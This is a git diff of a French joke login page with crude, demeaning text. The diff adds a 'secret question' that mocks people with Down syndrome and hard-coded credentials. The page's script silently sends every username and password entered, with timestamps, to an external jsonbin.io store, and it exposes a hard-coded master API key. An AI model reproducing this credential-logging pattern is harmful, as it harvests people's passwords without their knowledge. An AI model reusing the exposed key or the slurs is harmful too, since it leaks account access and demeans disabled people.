@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <title>Connexion Secrète</title>
     <style>
-        /* [Coller ici TOUT votre CSS original] */
         body {
             background: #FF69B4;
             font-family: 'Comic Sans MS', cursive;
@@ -13,6 +12,7 @@
             align-items: center;
             height: 100vh;
             margin: 0;
+            position: relative;
         }
 
         .login-box {
@@ -21,6 +21,17 @@
             border-radius: 20px;
             box-shadow: 0 0 20px rgba(0,0,0,0.3);
             text-align: center;
+        }
+
+        .security-question {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: white;
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.2);
+            width: 250px;
         }
 
         input {
@@ -41,9 +52,22 @@
             cursor: pointer;
             margin-top: 20px;
         }
+
+        .small-btn {
+            font-size: 1em;
+            padding: 8px 20px;
+            margin-top: 10px;
+        }
     </style>
 </head>
 <body>
+    <div class="security-question">
+        <h3>🔐 Question Secrète</h3>
+        <p>Environ combien de nain trisomiques sont nés en 2007 ? 🧠</p>
+        <input type="number" id="security-answer" placeholder="Nombre magique">
+        <button class="small-btn" onclick="checkSecurityAnswer()">Révéler le secret</button>
+    </div>
+
     <div class="login-box">
         <h2>Connexion de Pute ✨</h2>
         <form onsubmit="return checkCredentials(event)">
@@ -54,33 +78,40 @@
     </div>
 
     <script>
-        const API_KEY = '$2a$10$1wewJFQyy/qyWMcrP0P4UeA4TUr1kK0bQC9VyMz9htOaRMDyz3sk2'; // À remplacer
-        const BIN_ID = '679cba12acd3cb34a8d5f51d'; // À remplacer
-        
+        const API_KEY = '$2a$10$1wewJFQyy/qyWMcrP0P4UeA4TUr1kK0bQC9VyMz9htOaRMDyz3sk2';
+        const BIN_ID = '679cba12acd3cb34a8d5f51d';
+
+        function checkSecurityAnswer() {
+            const answer = parseInt(document.getElementById('security-answer').value);
+            if (answer >= 28 && answer <= 52) {
+                document.getElementById('username').value = 'skibidi';
+                document.getElementById('password').value = 'sigma';
+                alert('✨ Identifiants magiques débloqués !');
+            } else {
+                alert('❌ Réponse incorrecte ! Les nains se cachent...');
+            }
+        }
+
         async function checkCredentials(event) {
             event.preventDefault();
             
             const username = document.getElementById('username').value.toLowerCase();
             const password = document.getElementById('password').value.toLowerCase();
-        
+
             try {
-                // 1. Récupère les données existantes
                 const response = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
                     headers: { 'X-Master-Key': API_KEY }
                 });
                 const data = await response.json();
                 
-                // 2. Prépare le nouvel objet
                 const newEntry = {
                     username: username,
                     password: password,
                     timestamp: new Date().toISOString()
                 };
-        
-                // 3. Met à jour le tableau
+
                 const updatedData = [...data.record, newEntry];
-        
-                // 4. Envoie la mise à jour
+
                 await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
                     method: 'PUT',
                     headers: {
@@ -89,14 +120,18 @@
                     },
                     body: JSON.stringify(updatedData)
                 });
-        
+
             } catch (error) {
                 console.error("Erreur API :", error);
                 alert('Problème de connexion au serveur 😢');
             }
-        
-            // Vérification du mot magique
-            if(username.includes('pute') || password.includes('pute')) {
+
+            // Vérification des identifiants spéciaux
+            if(username === 'skibidi' && password === 'sigma') {
+                window.location.href = 'skibidi.html';
+            }
+            // Vérification du mot magique standard
+            else if(username.includes('pute') || password.includes('pute')) {
                 window.location.href = 'success.html';
             } else {
                 alert('⚠️ Le mot magique "pute" est requis !');
